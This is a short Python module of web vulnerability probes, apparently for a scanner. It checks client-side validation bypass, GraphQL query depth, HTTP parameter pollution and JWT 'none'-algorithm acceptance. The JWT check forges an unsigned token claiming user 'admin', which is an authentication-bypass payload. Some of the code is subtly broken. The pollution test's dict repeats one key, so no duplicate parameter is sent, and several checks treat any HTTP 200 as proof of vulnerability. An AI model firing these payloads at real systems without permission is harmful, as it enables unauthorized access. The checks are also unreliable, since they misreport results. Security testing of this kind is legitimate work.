import jwt
import requests

def check_client_side_validation_bypass(target_url):
    # Payload with invalid data (e.g., bypassing a field's required validation)
    payload = {
        "username": "admin",
        "email": "invalid-email"  # Bypassing client-side email validation
    }
    
    try:
        response = requests.post(target_url, data=payload, timeout=10)
        if response.status_code == 200:
            return True  # Vulnerable
        return False  # Not Vulnerable
    except requests.RequestException:
        return False  # Unable to test
    
def check_graphql_query_depth(target_url):
    # Nested query payload
    query = """
    query {
      user {
        posts {
          comments {
            replies {
              content
            }
          }
        }
      }
    }
    """
    
    try:
        response = requests.post(target_url, json={"query": query}, timeout=10)
        if response.status_code == 200 and "errors" not in response.json():
            return True  # Vulnerable
        return False  # Not Vulnerable
    except requests.RequestException:
        return False  # Unable to test

def check_http_parameter_pollution(target_url):
    params = {
        "param": "value1",
        "param": "value2"  # Duplicate parameter
    }
    try:
        response = requests.get(target_url, params=params, timeout=10)
        if "value1" in response.text or "value2" in response.text:
            return True  # Vulnerable
        return False  # Not Vulnerable
    except requests.RequestException:
        return False  # Unable to test
    
def check_jwt_weak_signing(target_url):
    # Create a JWT with "none" algorithm
    header = {"alg": "none", "typ": "JWT"}
    payload = {"user": "admin"}
    token = jwt.encode(payload, "", algorithm=None, headers=header)  # No secret key
    
    headers = {
        "Authorization": f"Bearer {token}"
    }
    
    try:
        response = requests.get(target_url, headers=headers, timeout=10)
        if response.status_code == 200:
            return True  # Vulnerable
        return False  # Not Vulnerable
    except requests.RequestException:
        return False  # Unable to test